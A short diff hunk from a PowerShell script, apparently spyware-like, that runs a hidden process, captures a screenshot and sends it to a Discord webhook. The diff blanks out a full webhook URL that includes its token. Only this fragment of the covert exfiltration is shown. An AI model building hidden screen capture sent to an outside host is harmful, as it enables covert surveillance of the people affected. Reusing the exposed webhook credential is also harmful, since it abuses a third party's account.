@@ -70,7 +70,7 @@ function Start-HiddenProcess {
 }
 
 # Webhook URL
-$WebhookUrl = "https://discord.com/api/webhooks/1279434221747961947/4v9LMvOEODPdrCLAPkBxgkjRc5Hkwfx2DkwBNy8AjJjp56aOwuuechnScKGGb77trwPb"
+$WebhookUrl = ""
 
 # Capture and send a single screenshot
 $screenshot = Capture-Screenshot
